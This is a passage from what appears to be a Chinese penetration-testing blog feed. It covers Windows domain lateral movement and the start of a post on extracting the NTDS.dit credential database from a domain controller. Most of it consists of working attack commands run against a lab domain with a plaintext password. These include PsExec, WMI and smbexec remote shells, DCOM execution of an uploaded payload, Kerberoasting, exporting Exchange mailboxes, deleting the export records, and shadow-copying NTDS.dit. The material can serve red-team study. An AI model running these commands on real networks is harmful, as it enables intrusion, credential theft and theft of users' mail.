src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214059710.png" alt="image-20240107214059710"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kerberos::ptt <span class="hljs-string">&quot;票据文件路径&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214108213.png" alt="image-20240107214108213"></p><ul><li><strong>PsExec的使用</strong><br>先建立ipc连接</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#获取system</span><br>PsExec.exe -accepteula \\10.10.10.11 -s cmd.exe<br><span class="hljs-comment">#获取admin权限</span><br>PsExec.exe -accepteula \\10.10.10.11  cmd.exe<br><span class="hljs-comment">#执行命令</span><br>PsExec.exe \\10.10.10.11 -u de1ay -p 274355ZWz cmd.exe /c <span class="hljs-string">&quot;ipconfig&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214117974.png" alt="image-20240107214117974"><br>1.-accepteula:第一次运行运行会弹出确认框，使用该参数就不会弹出确认框了<br>2.-s:以system权限运行远程程序，获取一个system权限交互的shell</p><ul><li><strong>msf中psexec</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit/windows/smb/psexec<br>exploit/windows/smb/psexec_psh(PsExec的powershell版本）<br></code></pre></td></tr></table></figure><h2 id="WMI的使用"><a href="#WMI的使用" class="headerlink" title="WMI的使用"></a>WMI的使用</h2><p>PsExec在内网中被严格监控后，越来越多的反病毒厂商将PsExec加入了黑名单。于是攻击者逐渐开始使用WMI进行横向移动。通过渗透发现，在使用wmiexec进行横向移动时，Windows操作系统默认不会将wmi的操作记录在日志中。</p><ul><li><strong>基本命令</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic /node:10.10.10.11 /user:de1ay /password:274355ZWz process call create <span class="hljs-string">&quot;cmd.exe&quot;</span> /c ipconfig&gt;C:\ip.txt<span class="hljs-string">&quot;</span><br><span class="hljs-string">#查看执行结果</span><br><span class="hljs-string">type \\10.10.10.11\c$\ip.txt</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214128889.png" alt="image-20240107214128889"></p><ul><li><strong>impacket 工具包中的wmiexec</strong><br>进入&#x2F;usr&#x2F;local&#x2F;bin目录</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 wmiexec.py  de1ay:274355ZWz@192.168.252.16<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214138706.png" alt="image-20240107214138706"></p><ul><li><strong>wmiexec.vbs</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">cscript.exe //nologo wmiexec.vbs /shell 10.10.10.11 de1ay 274355ZWz<br><span class="hljs-comment">#在远程主机上执行命令</span><br>csrcipt.exe wmiexec.vbs /cmd 10.10.10.11 de1ay 274355ZWz <span class="hljs-string">&quot;ipconfig&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214207506.png" alt="image-20240107214207506"></p><ul><li><strong>Invoke-WmiCommand.ps1</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;域名\用户名&quot;</span>     // 指定目标系统用户名<br><span class="hljs-variable">$Password</span> = ConvertTo-SecureString -String <span class="hljs-string">&quot;明文密码&quot;</span> -AsPlainText -Force   // 指定目标系统的密码<br><span class="hljs-variable">$Cred</span> = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span>    // 将账号和密码整合起来，以便导入credential<br><span class="hljs-variable">$Remote</span> = Invoke-WmiCommand -Payload &#123;要执行的命令&#125; -Credential <span class="hljs-variable">$Cred</span> -ComputerName 目标IP<br><span class="hljs-variable">$Remote</span>.PayloadOutput       // 将执行结果输出到屏幕上<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214216404.png" alt="image-20240107214216404"></p><ul><li><strong>Invoke-WMIMethod</strong><br>利用powershell自带得invoke-wmimethod，可以在远程系统中执行命令和指定程序。在powershell命令行环境中执行如下命令，可以以非交互式的方式执行命令，但不会回显。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$User</span>=<span class="hljs-string">&quot;de1ay\de1ay&quot;</span><br><span class="hljs-variable">$Password</span>=ConvertTo-SecureString -String <span class="hljs-string">&quot;274355ZWz&quot;</span> -AsplainText -force<br><span class="hljs-variable">$Cred</span>=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span><br> Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList <span class="hljs-string">&quot;calc.exe&quot;</span> -ComputerName <span class="hljs-string">&quot;10.10.10.11&quot;</span> -Credential <span class="hljs-variable">$Cred</span><br></code></pre></td></tr></table></figure><p>目标系统交互运行calc.exe程序。</p><ul><li><strong>smbexec使用</strong><br>impackt工具包中的smbexec.py</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbexec.py de1ay/de1ay:274355ZWz@192.168.43.16<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214227028.png" alt="image-20240107214227028"></p><h2 id="DCOM在远程系统中的使用"><a href="#DCOM在远程系统中的使用" class="headerlink" title="DCOM在远程系统中的使用"></a>DCOM在远程系统中的使用</h2><p>DCOM(分布式组件对象模型)是微软的一系列概念和接口。通过DCOM，客户端程序对象能过够向网络中另一台计算机上的服务器程序对象发送请求。</p><ul><li><strong>通过本地DCOM执行命令</strong><br>1.获取DCOM程序列表<br>Get-CimInstance这个cmdlet(powershell命令)默认只在powershell3.0以上版本中存在。也就是说，只有windows server2012及以上的版本才可以使用Get-CimInstance。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-CimInstance  Win32_DCOMApplication<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214239958.png" alt="image-20240107214239958"><br>因为windows7,server2008默认安装的是powershell2.0，所以它们都不支持Get-CimInstance.可以使用如下命令代替</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-WmiObject -Namespace  ROOT\CIMV2 -Class Win32_DCOMApplication<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214251386.png" alt="image-20240107214251386"></p><ul><li><strong>使用DCOM执行任意命令</strong><br>在本地启动一个管理员权限的powershell</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$com</span>=[activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;127.0.0.1&quot;</span>))<br><span class="hljs-variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>,<span class="hljs-string">&quot;Minimzed&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214301108.png" alt="image-20240107214301108"></p><ul><li><strong>使用DCOM在远程机器上执行命令</strong><br>在使用该方法时，必须使用具有本地管理员权限的账户<br>1.通过ipc$连接远程计算机</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use \\10.10.10.11 <span class="hljs-string">&quot;274355ZWz&quot;</span> /user:de1ay<br></code></pre></td></tr></table></figure><p>2.调用MMC20.Application远程执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$com</span>=[activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;10.10.10.11&quot;</span>))<br><span class="hljs-variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c c:\one.exe&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br></code></pre></td></tr></table></figure><p>先通过ipc将payload上传到目标机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy one.exe \\10.10.10.11\c$<br></code></pre></td></tr></table></figure><p>在执行上述命令<br><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214312621.png" alt="image-20240107214312621"><br>上线，并且是管理员权限<br>3.调用9BA05972-F6A8-11CF-A442-00A0C90A8F39</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$com</span>=[Type]::GetTypeFromCLSID(<span class="hljs-string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="hljs-string">&quot;10.10.10.11&quot;</span>)<br><span class="hljs-variable">$obj</span>=[System.Activator]::CreateInstance(<span class="hljs-variable">$com</span>)<br><span class="hljs-variable">$item</span>=<span class="hljs-variable">$obj</span>.item()<br><span class="hljs-variable">$item</span>.Document.Application.ShellExecute(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c c:\one&quot;</span>,<span class="hljs-string">&quot;c:\windows\system32&quot;</span>,<span class="hljs-variable">$null</span>,0)<br><br></code></pre></td></tr></table></figure><h2 id="SPN在域环境中的应用"><a href="#SPN在域环境中的应用" class="headerlink" title="SPN在域环境中的应用"></a>SPN在域环境中的应用</h2><p>windows域环境是基于微软的活动目录服务工作的，它在网路系统环境中将物理位置分散、所属部门不同的用户进行分组，集中资源管理。有效的地对资源访问控制权限进行细粒度的分配，提高了网路环境的安全性及网络资源统一分配管理的便利性。</p><p>SPN命令的格式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">SPN=serviceclass <span class="hljs-string">&quot;/&quot;</span> hostname [<span class="hljs-string">&quot;:&quot;</span>port] [<span class="hljs-string">&quot;/&quot;</span> servicename]<br> <br>serviceclass 服务组件的名称<br>hostname 以<span class="hljs-string">&quot;/&quot;</span>与面的名称分隔，是计算机的FQDN（全限定域名，同时带有计算机名和域名)<br>port  以冒号分隔，后面的内容为该服务监听的端口<br>servicename  一个字符串，可以是服务的专有名称<br></code></pre></td></tr></table></figure><p>常见的SPN服务<br>mssql服务的示列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">MSSQLSvc/computer1.pentest.com:1433<br>MSSQLSvc  服务组件的名称，此处为mssql服务<br>computer.pentest.com 主机名为computer,域名为pentest.com<br>1433 监听端口为1433<br></code></pre></td></tr></table></figure><p>servicecass和hostname是必选参数,port和servicename是可选参数</p><ul><li><strong>SPN扫描的powershell脚本</strong><br><a href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a><br>SPN扫描也称作“扫描Kerberos服务实例名称”<br><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214322417.png" alt="image-20240107214322417"><br>这里面有很多扫描spn服务的脚本也有扫描所有服务的<br>1.扫描mssql服务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">import-moudle .\Discover-PSMSSQL-Servers.ps1<br>Discover-PSMSSQLServers<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214332855.png" alt="image-20240107214332855"><br>2.扫描所有服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">import-module .\Discover-PSInteresestingServices.ps1<br>Discover-PSInteresestingServices<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214344646.png" alt="image-20240107214344646"></p><p>在不使用第三方powershell脚本的情况下,输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -T domain -q */*<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214358364.png" alt="image-20240107214358364"></p><ul><li><p><strong>Kerberoast攻击分析与防范</strong></p><p>1.配置mssql服务 ，破解该服务的票据<br>手动注册</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -A MSSQLSvc/computer.de1ay.com:1433  mssql<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214409269.png" alt="image-20240107214409269"><br>     2.查看用户对应的SPN<br>    查看指定用户注册的SPN</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -L de1ay.com\mssql<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240107214422225.png" alt="image-20240107214422225"><br>    查看所有注册的SPN</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -T domain -q */*<br></code></pre></td></tr></table></figure><p>​3.配置指定服务的登录权限<br>​在活动目录中为用户配置指定服务的登录权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpedit.msc \Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights Assignment\Log on as a service <br></code></pre></td></tr></table></figure><p>​4.修改加密类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpedit.msc\Computer Configuration\Windows Setting\Security Settings\Local Policies\Seurity Options\Network security: Configure encryption types allowed <span class="hljs-keyword">for</span> Kerberos<br></code></pre></td></tr></table></figure><p>​5.请求SPN Kerberos票据<br>​打开powershell输入如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Add-Type -AssemblyName System.IdentityModel <br>New-Object System.IdentityModel.Tokens.KerberosRequestor SecurityToken -ArgumentList <span class="hljs-string">&quot;MSSQLSvc/de1ay.de1ay.com&quot;</span><br></code></pre></td></tr></table></figure><p>​两篇干货文章</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA%3D%3D&amp;chksm=fc781175cb0f986392b4c78112dcd01bf5c71e7d6bdc292f0d8a556cc27e6bd8ebc54278165d&amp;idx=1&amp;mid=2247488936&amp;scene=21&amp;sn=82c127c8ad6d3e36f1a977e5ba122228<span class="hljs-comment">#wechat_redirect</span><br><br>https://blog.csdn.net/shuteer_xu/article/details/106030671<br><br></code></pre></td></tr></table></figure><h2 id="Exchange邮件服务"><a href="#Exchange邮件服务" class="headerlink" title="Exchange邮件服务"></a>Exchange邮件服务</h2><ul><li><strong>Exchange服务发现</strong><br>1.基于端口发现<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A -O -sV 192.168.43.1<br></code></pre></td></tr></table></figure>2.SPN查询<br>在安装Exchange时，SPN就被注册在活动目录中了。在域环境中通过SPN来发现Exchange服务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -T de1ay.com -F -Q */*<br></code></pre></td></tr></table></figure><ul><li><strong>Exchange的基本操作</strong><br>Exchange是一个电子邮件系统，那么其中必然存在数据库。Exchange数据库的后缀为”.edb”。.<br>1.查看邮件数据库<br>在powershell命令行环境中输入<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxDatabase -server <span class="hljs-string">&quot;Exchange1&quot;</span><br></code></pre></td></tr></table></figure>在正常的powershell中没有这条命令的，需要输入如下命令。将Exchange管理单元添加到当前会话。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">add-pssnapin microsoft.exchange*<br></code></pre></td></tr></table></figure><p>可以指定数据库，对其详细信息进行查询。查询数据库物理路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxDatabase -Identity <span class="hljs-string">&#x27;Mailbox Database 188899384&#x27;</span> | Format-List Name,EdbFilePath,LogFolderPath<br></code></pre></td></tr></table></figure><p>2.获取现有用户的邮件地址<br>使用powershell进行查询，列举Exchange中所有的用户及其邮件地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-Mailbox | format-tables Name,WindowsEmaiAddress<br></code></pre></td></tr></table></figure><p>3.查看指定用户的邮箱使用信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">get-mailboxstatistics -identity administrator | select DisplayName,ItemCount,TotalItemSize,LastLogonTime<br></code></pre></td></tr></table></figure><p>4.获取用户邮箱中的邮件数量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Sort-Object TotalItemSize -Descend<br></code></pre></td></tr></table></figure><ul><li><strong>导出指定的电子邮件</strong><br>Exchange邮件的文件后缀为“.pst”,在Exchange server 2007中导出邮件，需要使用Export-Mailbox命令。在Exchange Server 2010 SP1及以后的版本的Exchange中导出邮件，可以使用 图形化界面，也可以使用powershell<br>1.配置用户导出\导出的权限<br>查看有导入导出权限的用户</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-ManagementRoleAssignment -role <span class="hljs-string">&quot;Mailbox Import Export&quot;</span> | Format-List RoleAssigneeName<br></code></pre></td></tr></table></figure><p>2.添加权限<br>将Adminstrator用户添加到Mailbox Import Export角色中，就可以通过Powershell导出用户的邮件了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">New-ManagementRoleAssignment -Name <span class="hljs-string">&quot;Import Export_Domain Admins&quot;</span> -User <span class="hljs-string">&quot;Administrator&quot;</span> -Role <span class="hljs-string">&quot;Mailbox Import Export&quot;</span><br></code></pre></td></tr></table></figure><p>3.删除权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Remove-ManagementRoleAssignment  <span class="hljs-string">&quot;Import Export_Domain Admins&quot;</span> -Confirm:<span class="hljs-variable">$false</span><br></code></pre></td></tr></table></figure><p>在将用户添加到角色组中，需要重启Exchange服务器才能执行导出操作</p><ul><li><strong>设置网络共享文件夹</strong><br>不论那种方式导出邮件，都需要将文件放置在UNC（共享文件)路径下</li></ul><p>设置共享文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net share inetpub=c:\inetpub /grant:everyone,full<br></code></pre></td></tr></table></figure><p>设置成功后可以是使用net share查看</p><ul><li><strong>导出用户的电子邮件</strong><br>1.使用powershell导出电子邮件<br>用户的电子邮箱目录一般分为Inbox(收件箱），SentItems（已发送邮件),DeletedItems（已删除邮件),Drafts（草稿)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">New-MailboxExportRequest -Mailbox administrator -FilePath \\10.10.10.11\inetpub\administrator.pst<br></code></pre></td></tr></table></figure><ul><li><strong>管理导出请求</strong><br>不论是使用powershell导出电子邮件，还是图形化都会留下相关信息。<br>在powershell中输入</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxExportRequest<br></code></pre></td></tr></table></figure><p>查看导出请求<br>使用如下命令可以将指定用户的已完成导出请求删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Remove-MailboxExportRequest -Identity Administrator\mailboxexport<br></code></pre></td></tr></table></figure><p>使用如下命令可以将所有已完成的导出请求删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>域内横向移动</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域控制器安全</title>
    <link href="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    <url>/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通常情况下，即使拥有管理员权限，也无法读取域控制器中的C:\windows\NTDS\ntds.dit文件（活动目录始终访问这个文件）。使用windows本地卷影拷贝服务，就可以获得文件的副本。</p><h2 id="使用卷影拷贝服务提取ntds-dit"><a href="#使用卷影拷贝服务提取ntds-dit" class="headerlink" title="使用卷影拷贝服务提取ntds.dit"></a>使用卷影拷贝服务提取ntds.dit</h2><p>在活动目录中，所有的数据都保存在ntds.dit文件中。ntds.dit是一个二进制文件，储存位置为域控制器的%SystemRoot%\ntds\ntds.dit。ntds.dit中包含(但不限于)用户名，散列值，组，GPP，OU等与活动目录相关的信息。它和SAM文件一样，是被Windows操作系统锁定的。</p><ul><li><strong>使用ntdsutil.exe提取ntds.dit</strong><br>ntdsutil.exe是一个为活动目录提供管理机制的命令行工具。使用ntdsutil.exe,可以维护和管理活动目录数据库，控制单个主机操作，创建引用程序目录分区，删除由未使用活动目录安装向导成功降级的域控制器留下的元数据等。该工具默认安装在域控制器上，可以在域控制器上直接操作，也可以通过域内机器在域控制器上远程操作。ntdsutil.exe支持的操作系统由windows server2003,windows server 2008,windwos server  2012。</li></ul><p>在域控制器的命令行环境中输入如下命令，创建快照。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil snapshot <span class="hljs-string">&quot;activate instance ntds&quot;</span> create quit quit<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107171533778.png" alt="image-20240107171533778"></p><p>可以看到创建了一个GUID为0c5ecd15-d722-41fa-9e0a-424c4d19ac64的快照</p><p>加载刚刚的快照</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil snapshot <span class="hljs-string">&quot;mount &#123;0c5ecd15-d722-41fa-9e0a-424c4d19ac64&#125;&quot;</span> quite quite<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/image-20240107171646050.png" alt="image-20240107171646050">使用如下命令将文件复制出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy C:\$SNAP_202106071917_VOLUMEC$\windows\ntds\ntds.dit  c:\temp\ntds.dit<br></code></pre></td></tr></table></figure><p><img 